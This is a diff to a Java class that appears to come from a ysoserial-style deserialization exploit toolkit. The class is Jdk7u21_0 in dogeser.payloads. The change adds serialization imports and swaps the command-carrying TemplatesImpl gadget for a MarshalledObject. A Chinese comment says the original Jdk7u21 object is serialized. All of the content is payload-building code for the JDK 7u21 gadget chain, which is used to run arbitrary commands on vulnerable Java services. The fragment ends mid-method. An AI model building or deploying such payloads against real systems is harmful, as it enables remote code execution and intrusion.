@@ -3,6 +3,9 @@ package dogeser.payloads;
 import java.lang.reflect.InvocationHandler;
 import java.util.HashMap;
 import java.util.LinkedHashSet;
+import java.io.ByteArrayOutputStream;
+import java.io.ObjectOutput;
+import java.io.ObjectOutputStream;
 
 import javax.xml.transform.Templates;
 
@@ -22,8 +25,8 @@ import dogeser.payloads.util.Reflections;
 public class Jdk7u21_0 implements ObjectPayload<Object> {
 
     public Object getObject(final String command) throws Exception {
-        final Object templates = dogeser.payloads.util.Gadgets.createTemplatesImpl(command);
-        //final MarshalledObject templates = new MarshalledObject(null);
+        //final Object templates = dogeser.payloads.util.Gadgets.createTemplatesImpl(command);
+        final MarshalledObject templates = new MarshalledObject(null);
 //        序列化原始Jdk7u21obj
         Object obj = new Jdk7u21().getObject(command);
         ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
